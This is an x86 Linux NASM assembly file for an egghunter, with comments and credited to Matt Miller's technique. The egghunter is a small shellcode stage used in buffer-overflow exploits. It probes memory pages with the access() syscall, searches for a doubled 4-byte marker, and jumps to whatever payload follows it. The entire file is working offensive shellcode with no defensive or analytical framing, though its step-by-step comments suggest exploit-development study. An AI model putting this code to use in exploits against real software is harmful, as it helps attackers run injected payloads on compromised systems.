; egghunter.nasm
; Author: Michael Norris
; Credit: Matt Miller

global _start

section .text
_start:
    xor edx, edx        ; clear EDX

align_page:
    ;sets EDX to PAGE_SIZE-1
    or dx, 0xfff        ; sets EDX to fff; e.g. 0x0fff, 0x1fff

inc_address:
    inc edx             ; increases EDX by one; e.g. 0x1000, 0x2000, 0x2001

    ; preparation for SYS_access
    ; int access(const char *pathname, int mode);
    lea ebx, [edx+0x4]  ; pathname
    push byte 0x21      ; system call number for access
    pop eax             ; 0x21
    int 0x80            ; software interrupt; returns 0xfffffff2 on EFAULT

    ; compare return value of SYS_access to find writable page
    cmp al, 0xf2        ; sets ZF when comparison is true
    jz align_page       ; jumps to align_page when ZF is set

    ; prepares for egg hunt
    mov eax, 0x50905090 ; 4-byte egghunter key
    mov edi, edx        ; EDX contains memory address of writable page
    
    ; hunts for first 4 bytes of egg; scasd sets ZF when match is true
    scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
    jnz inc_address     ; jumps to inc_address when ZF is not set
    
    ; hunts for last 4 bytes of egg
    scasd               ; hunts for last 4 bytes of egg
    jnz inc_address

    ; jumps to beginning of shellcode
    jmp edi
